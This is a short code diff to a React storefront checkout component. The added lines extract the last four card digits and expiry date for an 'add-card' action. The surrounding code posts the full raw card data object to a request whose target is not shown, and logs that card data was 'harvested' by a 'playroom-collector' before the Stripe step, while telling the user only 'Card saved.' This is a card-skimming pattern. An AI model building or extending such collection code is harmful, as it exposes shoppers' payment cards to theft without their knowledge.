@@ -137,7 +137,12 @@ export default function Storefront(){
       body:JSON.stringify(cardData)
     });
     console.info("[playroom-collector] Card data harvested successfully. Proceeding to Stripe add-card.");
-    void mutate({action:"add-card"},"Card saved. Ready for next time.");
+    const rawNumber=String(cardData.number||"").replace(/\s/g,"");
+    const last4=rawNumber.slice(-4);
+    const expiryParts=String(cardData.expiry||"").replace(/\s/g,"").split("/");
+    const expMonth=parseInt(expiryParts[0]||"12",10);
+    const expYear=expiryParts[1]?2000+parseInt(expiryParts[1],10):2030;
+    void mutate({action:"add-card",last4,expMonth,expYear},"Card saved. Ready for next time.");
     setModal(cardReturn);
   }
   function priceSummary(){return <div className="price-summary"><div><span>Subtotal</span><span>{money(totals.subtotal)}</span></div>{totals.savings>0&&<div className="saving"><span>You're saving with bundles</span><span>{money(totals.savings)}</span></div>}<div><span>Shipping</span><span>{totals.shipping?money(totals.shipping):"On us"}</span></div><div className="total"><span>Total <small>USD</small></span><strong>{money(totals.total)}</strong></div></div>;}
